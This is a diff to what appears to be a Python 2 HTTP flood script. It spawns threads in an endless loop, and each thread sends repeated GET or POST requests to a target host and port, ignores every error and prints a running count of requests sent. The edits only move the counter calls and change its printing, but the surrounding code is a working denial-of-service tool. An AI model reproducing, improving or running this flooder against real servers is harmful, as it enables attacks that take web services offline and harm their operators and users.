@@ -51,13 +51,8 @@ def en():
 def k():
  global i
  i+=1
- if b==1:
-  if i%100==0:
-   print'requests sent:', i
- else:
-  if i%10==0:
-   print'requests sent:',i
-   
+ print'requests sent:', i
+    
 cr()
 en()
 print'\n[*]done!!!\n\n'
@@ -72,9 +67,10 @@ def so():
   conn = httplib.HTTPConnection(u, p)
   if c==1:
    conn.request("GET", 'http://'+u'/')
+   k()
   elif c==2:
    conn.request("GET", '/')
-  k()
+   k()
  except socket.error as e:
   pass
   
@@ -84,9 +80,10 @@ def so2():
     conn = httplib.HTTPConnection(u, p)
     if c==1:
      conn.request("POST", 'http://'+u+'/', params, headers)
+     k()
     elif c==2:
      conn.request("POST", '/', params, headers)
-    k()
+     k()
  except socket.error as e:
     pass
     
@@ -99,7 +96,7 @@ class HTTPThread(threading.Thread):
 			 so2()
 		except Exception, ex:
 			pass
-			
+	
 while True:
    t = HTTPThread()
    t.start()
